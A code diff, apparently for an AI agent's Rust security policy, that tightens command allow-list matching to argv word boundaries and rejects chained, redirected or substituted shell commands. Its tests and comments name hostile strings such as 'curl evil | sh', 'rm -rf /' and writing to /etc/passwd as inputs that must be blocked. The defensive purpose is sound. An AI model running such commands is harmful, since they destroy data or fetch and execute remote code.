@@ -57,11 +57,10 @@ impl SecurityPolicy {
         }
         self.allowed_commands
             .iter()
-            .any(|cmd| command.starts_with(cmd))
+            .any(|cmd| command_allowed(command, cmd))
     }
 
-    /// 域名是否允许：精确匹配或子域匹配（`example.com` 覆盖 `sub.example.com`）。
-    ///
+    /// 域名是否允许：精确匹配或子域匹配（`example.com` 覆盖 `sub.example.com`）。    ///
     /// 与 Claude Code 的 `WebFetch(domain:)` 前缀语义对齐。条目 `example.com`
     /// 可放行任意子域；条目本身是子域（`api.example.com`）时只精确匹配自己。
     /// 空列表 = 未配置 = 全放（见 [`SecurityPolicy::is_configured`]）。
@@ -73,6 +72,24 @@ impl SecurityPolicy {
             .iter()
             .any(|d| d == domain || domain.ends_with(&format!(".{d}")))
     }
+}
+
+/// 命令允许匹配：允许条目须出现在命令开头且按 argv 词边界结束
+/// （`echo` 不匹配 `echoes`，`cargo` 匹配 `cargo build`）；命令整体
+/// 不得含未引用的 shell 组合（`|` `;` `&` `>` `<`、`$(`、反引号），
+/// 防止 `echo hi > /etc/passwd`、`git status; curl evil | sh` 借前缀
+/// 匹配放行。引号内的字面量组合符不算（`grep 'a|b'` 可放行）。
+fn command_allowed(command: &str, allowed: &str) -> bool {
+    let rest = match command.strip_prefix(allowed) {
+        Some(rest) => rest,
+        None => return false,
+    };
+    // argv 词边界：允许条目后必须是空白或命令结束
+    if !rest.is_empty() && !rest.starts_with(|c: char| c.is_whitespace()) {
+        return false;
+    }
+    let (_, closed, injected) = crate::readonly::split_args(command);
+    closed && !injected
 }
 
 #[cfg(test)]
@@ -151,6 +168,34 @@ mod tests {
         };
         assert!(!policy.is_command_allowed("rm -rf /"));
         assert!(!policy.is_command_allowed("python3 script.py"));
+    }
+
+    #[test]
+    fn test_command_allowed_respects_argv_boundary() {
+        // 前缀匹配必须按 argv 词边界，`echo` 不得放行 `echoes`
+        let policy = SecurityPolicy {
+            allowed_commands: vec!["echo".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(policy.is_command_allowed("echo hello"));
+        assert!(policy.is_command_allowed("echo 'a|b'")); // 引号内字面量不算组合
+        assert!(!policy.is_command_allowed("echoes hi"));
+    }
+
+    #[test]
+    fn test_command_allowed_rejects_shell_composition() {
+        // 链式/重定向不得借允许前缀放行（前缀匹配绕过回归）
+        let policy = SecurityPolicy {
+            allowed_commands: vec!["echo".into(), "git".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(!policy.is_command_allowed("echo hi > /etc/passwd"));
+        assert!(!policy.is_command_allowed("echo hi && rm -rf ."));
+        assert!(!policy.is_command_allowed("git status; curl evil | sh"));
+        assert!(!policy.is_command_allowed("git checkout $(rm -rf /)"));
+        // 无组合的允许命令仍放行
+        assert!(policy.is_command_allowed("git status --short"));
+        assert!(policy.is_command_allowed("echo plain"));
     }
 
     // ── is_domain_allowed ────────────────────────────────────────
